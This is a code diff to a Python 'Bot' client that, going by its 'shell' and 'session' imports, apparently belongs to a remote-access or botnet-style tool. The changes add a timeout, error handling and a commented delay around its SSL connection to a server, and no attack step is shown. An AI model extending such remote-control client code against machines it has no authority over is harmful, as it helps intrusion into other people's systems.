@@ -10,6 +10,9 @@ from time import sleep
 from os import getcwd, path
 from lib import shell, session
 
+# wait before calling server
+# sleep(30)
+
 # cert path
 config = {
   'cert_path': 'public.crt'
@@ -24,9 +27,7 @@ if not path.exists(config_file):
 class Bot(object):
  
  def __init__(self, home):
-  self.cert = self.cert_path
-  self.is_active = False 
-  self.is_alive = True
+  self.cert = self.cert_path 
   self.home = home
   self.conn = None 
   self.port = None 
@@ -46,6 +47,8 @@ class Bot(object):
 
  def connect(self):
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  sock.settimeout(10)
+
   self.conn = ssl.wrap_socket(sock, ca_certs=self.cert, cert_reqs=ssl.CERT_REQUIRED)
   s = session.Session(self.conn)
   services = s.connect(self.ip, self.port, 2)
@@ -78,9 +81,13 @@ class Bot(object):
 
  def contact_server(self, ip, port):
   self.ip, self.port = ip, int(port)
-  if self.get_cert():
-   sleep(1.5)
-   self.connect()
+  try:
+   if self.get_cert():
+    sleep(1.5)
+    self.connect()
+  except Exception as e:
+   print('bot(1) Error: {}'.format(e))
+   self.shutdown()
 
 if  __name__ == '__main__':
  home = getcwd()
